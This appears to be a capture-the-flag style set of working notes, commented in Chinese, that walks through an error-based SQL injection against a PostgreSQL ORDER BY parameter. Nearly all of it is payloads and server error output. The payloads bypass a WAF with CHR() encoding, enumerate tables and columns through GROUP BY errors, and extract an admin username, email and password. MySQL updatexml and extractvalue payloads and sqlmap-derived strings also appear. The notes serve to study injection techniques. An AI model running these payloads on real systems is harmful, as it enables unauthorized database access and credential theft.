and(updatexml(1,concat(0x7e,(select database())),0));
attack detected


and(updatexml(1,concat('%7e',(select current_database())),0))


and%28updatexml%281%2cconcat%28%7e%2c%28select%20database%28%29%29%29%2c0%29%29%3b

union(select 1,(payload),3);


and(updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1))

union(select 1,version(),3);






and 1=updatexml(concat('~','1'),concat('~',version()),concat('~','0'))
and(updatexml(1,concat('%7e',(select%20version())),0))





------------------------------

and page=1 --
ERROR:  operator does not exist: character varying = integer
PostgreSQL （pgsql）


,0
ERROR:  ORDER BY position 0 is not in select list
LINE 1: ...meout TO 100; COMMIT;SELECT * FROM contents order by page ,0


,1,2
You need to be authenticated to access records</body></html>

,1,2,3
ERROR:  ORDER BY position 3 is not in select list
LINE 1: ...t TO 100; COMMIT;SELECT * FROM contents order by page ,1,2,3


ERROR:  column "cc" does not exist
LINE 1: ...100; COMMIT;SELECT * FROM contents order by page ,id,page,cc

推测 contents 只有 2 列，且其中一列是 page，另一列是 id


and%20(select%20null,version())
>ERROR:  subquery must return only one column
LINE 1: ...; COMMIT;SELECT * FROM contents order by page and (select nu...



LIMIT 1 procedure analyse(extractvalue(rand(),concat(%3a,version(),user(),%3a)),1)



SQLmap 无效，被waf了

ASC,(
	CAST(
			(
				CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113)
			)||
			(
				SELECT (
					CASE WHEN (1788=1788) THEN 1 ELSE 0 END)
				)::text||
				(CHR(113)||CHR(106)||CHR(107)||CHR(113)||CHR(113)
			) AS NUMERIC
	)
)


# sqlmap 提供的 payload
ASC,(CAST((CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (1788=1788) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(107)||CHR(113)||CHR(113)) AS NUMERIC))



# 获取数据库版本  
,(CAST((version()) AS NUMERIC))
,(CAST((version())::text AS NUMERIC))
,(CAST((SELECT version()) AS NUMERIC))
ERROR:  invalid input syntax for type numeric: "qPostgreSQL 9.3.20 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4, 64-bit"

# 获取数据库名称
,(CAST((current_database()) AS NUMERIC))
,(CAST((current_database())::text AS NUMERIC))
,(CAST((SELECT current_database()) AS NUMERIC))
ERROR:  invalid input syntax for type numeric: "c_webserveur_34"

# ::text  目的是令 cast 必定报错
# 使用 CHR() 目的是代替被过滤的引号
# 1788 条件用于盲注   CHR(121)='y'  CHR(110)='n'
# 这样就可以开始逐个字符猜我们想要的信息了
,(CAST((SELECT (CASE WHEN (1788=1788) THEN CHR(121) ELSE CHR(110) END))::text AS NUMERIC))

# CASE WHEN (ASCII(SUBSTR('',i,1))>K)
#,(CAST((SELECT (CASE WHEN (ASCII(SUBSTRING('',version(),1))>CHR(110)) THEN CHR(121) ELSE CHR(110) END))::text AS NUMERIC))




# 获取Schemas名称
,(CAST((SELECT schemaname FROM pg_tables limit 1)::text AS NUMERIC))
ERROR:  invalid input syntax for type numeric: "pg_catalog"


# 查询表数量
# 因为 count(1) 是数字导致 AS NUMERIC 不会报错，因此前面拼接 CHR(113)  令其报错
,(CAST(CHR(113)||(SELECT count(1) FROM pg_tables limit 1)::text AS NUMERIC))
ERROR:  invalid input syntax for type numeric: "q60"


# 查询表名
,(CAST((SELECT tablename from pg_tables)::text AS NUMERIC))
>ERROR:  more than one row returned by a subquery used as an expression

#  限制返回值为 1
# 通过偏移值可以获取所有表 （可以利用 Burp 的 Intruder ，也可编写程序 ）
,(CAST((SELECT tablename from pg_tables limit 1 offset 1)::text AS NUMERIC))
>ERROR:  invalid input syntax for type numeric: "pg_type"


,(CAST((SELECT tablename from pg_tables limit 1 offset 1)::text AS NUMERIC))
ERROR:  invalid input syntax for type numeric: "m3mbr35t4bl3"

,(CAST((SELECT tablename from pg_tables limit 1 offset 30)::text AS NUMERIC))
ERROR:  invalid input syntax for type numeric: "pg_db_role_setting"



,(CAST((SELECT tablename from pg_tables limit 1 offset 59)::text AS NUMERIC))
ERROR:  invalid input syntax for type numeric: "sql_parts"


# 查询列名
,(CAST(CHR(113)||(SELECT count(1) from pg_attribute limit 1)::text AS NUMERIC))
>ERROR:  invalid input syntax for type numeric: "q2291"

,(CAST((SELECT attname from pg_attribute limit 1)::text AS NUMERIC))
>ERROR:  invalid input syntax for type numeric: "proname"




# 查询目标表行数
,(CAST(CHR(113)||(SELECT count(1) from m3mbr35t4bl3 limit 1)::text AS NUMERIC))
>Contents List</h3>ERROR:  invalid input syntax for type numeric: "q1"


# 查询目标表列名 （group by 可以用列号代替列名）
,(CAST((SELECT * from m3mbr35t4bl3 group by 1)::text AS NUMERIC))
>ERROR:  column "m3mbr35t4bl3.us3rn4m3_c0l" must appear in the GROUP BY clause or be used in an aggregate function
LINE 1: ...M contents order by page ,(CAST(CHR(113)||(SELECT * from m3m...

# 利用 select * 的列表必须要出现在 group by 列表的特性 推出所有列名
,(CAST((SELECT * from m3mbr35t4bl3 group by us3rn4m3_c0l)::text AS NUMERIC))
>ERROR:  column "m3mbr35t4bl3.id" must appear in the GROUP BY clause or be used in an aggregate function
LINE 1: ...M contents order by page ,(CAST(CHR(113)||(SELECT * from m3m...


,(CAST((SELECT * from m3mbr35t4bl3 group by us3rn4m3_c0l,id)::text AS NUMERIC))
>ERROR:  column "m3mbr35t4bl3.p455w0rd_c0l" must appear in the GROUP BY clause or be used in an aggregate function
LINE 1: ...LECT * FROM contents order by page ,(CAST((SELECT * from m3m...


,(CAST((SELECT * from m3mbr35t4bl3 group by us3rn4m3_c0l,id,p455w0rd_c0l)::text AS NUMERIC))
>ERROR:  column "m3mbr35t4bl3.em41l_c0l" must appear in the GROUP BY clause or be used in an aggregate function
LINE 1: ...M contents order by page ,(CAST(CHR(113)||(SELECT * from m3m...

# 至此知道只有4列
,(CAST((SELECT * from m3mbr35t4bl3 group by us3rn4m3_c0l,id,p455w0rd_c0l,em41l_c0l)::text AS NUMERIC))
>ERROR:  subquery must return only one column
LINE 1: ...OMMIT;SELECT * FROM contents order by page ,(CAST((SELECT * ...


# 查询目标表 内容
,(CAST((SELECT us3rn4m3_c0l from m3mbr35t4bl3 limit 1)::text AS NUMERIC))
>ERROR:  invalid input syntax for type numeric: "admin"

,(CAST((SELECT em41l_c0l from m3mbr35t4bl3 limit 1)::text AS NUMERIC))
>ERROR:  invalid input syntax for type numeric: "admin@localhost"

,(CAST((SELECT p455w0rd_c0l from m3mbr35t4bl3 limit 1)::text AS NUMERIC))
>ERROR:  invalid input syntax for type numeric: "1a2BdKT5DIx3qxQN3UaC"


,(CAST(CHR(113)||(SELECT id from m3mbr35t4bl3 limit 1)::text AS NUMERIC))
>ERROR:  invalid input syntax for type numeric: "q1